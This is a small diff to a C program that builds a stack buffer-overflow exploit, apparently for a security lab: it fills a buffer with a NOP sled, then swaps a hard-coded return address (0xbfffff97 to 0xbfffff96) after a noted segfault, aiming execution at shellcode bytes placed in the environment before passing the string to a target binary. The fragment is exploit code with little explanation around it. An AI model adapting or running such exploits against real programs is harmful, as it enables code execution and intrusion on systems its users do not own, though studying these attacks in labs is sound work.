@@ -19,8 +19,11 @@ int main(void)
   {
   	strcat(str, "\x90");
   }
-  strcat(str, "\x97\xff\xff\xbf");
-  // 0xbfffff97:	0xdb31c031
+  // Segfault:
+  // strcat(str, "\x97\xff\xff\xbf");
+  // env: 0xbfffff97:	0xdb31c031
+
+  strcat(str, "\x96\xff\xff\xbf");
 
   args[0] = TARGET;
   // max input size is 4 * 5 = 20
